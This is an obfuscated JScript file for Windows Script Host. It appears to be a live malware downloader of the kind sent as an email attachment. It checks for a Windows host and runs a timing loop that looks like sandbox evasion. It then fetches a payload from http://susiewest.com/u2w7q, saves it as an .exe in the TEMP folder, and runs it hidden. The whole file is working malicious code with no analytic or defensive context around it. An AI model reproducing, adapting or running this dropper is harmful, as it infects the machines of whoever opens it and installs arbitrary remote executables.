var _NS = false;
var _XO = "CreateObject";
var _Y0 = function _U() {return WScript[_XO]("WScript"+".Shell");}(), _L = 11;
var _P = "MSXML2.XMLHTTP";
var _ZB = 2123213;
var _M = 0;
function _LI(_W0){_Y0["Run"](_W0, _M, _M);};
function _PA(){return _P + "";};
function _VI(_YB, _EJ){_M = _M * 1; return _YB - _EJ;};
function _DR(){return _XO;};
/*@cc_on
  @if (@_win32 || @_win64)
    _NS = true;
  @end
@*/
if (_NS)
{
var _T = "";
function _BD(){return 22;};
var _BG = 0; var _OP = 0;
function _D()
{
var _M0 = new this["Date"]();
var _C = _M0["getUTCMilliseconds"]();
WScript["Sleep"](_BD());
var _M0 = new this["Date"]();
var _H = _M0["getUTCMilliseconds"]();
WScript["Sleep"](_BD());
var _M0 = new this["Date"]();
var _VD = _M0["getUTCMilliseconds"]();
var _BG = "_W";
_BG = _VI(_H, _C);
var _OP = "_V0";
_OP = _VI(_VD, _H);
_T = "open";
return _VI(_BG, _OP);
}
var _Y = false;
var _O = false;
for (var _A = _M; _A < _BD() * 1; _A++){if (_D() != _M){
_Y = true; 
_OP = "31" + 11 * _BG + _OP; 
_O = true; 
break;
}}
function _I() {return ((_Y == true) && (_Y == _O)) ? 1 : _M;};
if (_Y && _I() && _O){
function _F() {return _Y0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "aowOIbdj7jP6.ex" + "e";};
 _HS = _PA();
 _HQ = WScript[_XO](_HS);
 var _FB = 1;
 while (_FB){
try {
	if (_FB == 1)
	{
		_HQ[_T]("GET", "http://susiewest.com/u2w7q", false);
		_HQ["send"]();
		_E = "Sleep";
	}
	WScript[_E](_BD() + 120); 
	if (_HQ["readystate"] < 2 * 2) continue;
	_FB = _M;
	function _SY(_T0) {var _U0 = (1, 2, 3, 4, 5, _T0); return _U0;};
	_B = WScript[_DR()]("ADODB.Stream");
	_HS = _B;
	_HS[_T]();
	_HS["type"] = _SY(1);
	_HS["write"](_HQ["ResponseBody"]);
	_B["position"] = _SY(_M);
	_HS["Save" + "ToFile"](_F(), 2);
	_B["cl"+"ose"]();
	_V = _F();
	_LI(_V);
} catch(_XL){};
}
}
}

